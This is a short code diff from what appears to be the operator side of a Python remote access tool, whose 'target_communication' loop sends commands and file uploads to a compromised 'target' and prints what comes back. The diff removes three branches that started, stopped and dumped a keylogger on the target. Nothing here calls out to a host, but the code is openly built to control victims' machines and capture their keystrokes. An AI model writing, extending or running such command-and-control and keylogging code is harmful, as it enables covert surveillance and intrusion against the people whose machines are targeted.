@@ -83,21 +83,6 @@ def target_communication():
         elif command[:6] == 'upload':
             # If the user enters 'upload', initiate the upload of a file to the target.
             upload_file(command[7:])
-        elif command == 'keylogger_start':
-            # If the user enters 'keylogger_start', start the keylogger on the target.
-            result = reliable_recv()
-            print(result)
-            pass
-        elif command == 'keylogger_stop':
-            # If the user enters 'keylogger_stop', stop the keylogger on the target.
-            result = reliable_recv()
-            print(result)
-            pass
-        elif command == 'keylogger_dump':
-            # If the user enters 'keylogger_dump', retrieve the keylogger data from the target.
-            result = reliable_recv()
-            print(result)
-            pass
         else:
             # For other commands, receive and print the result from the target.
             result = reliable_recv()
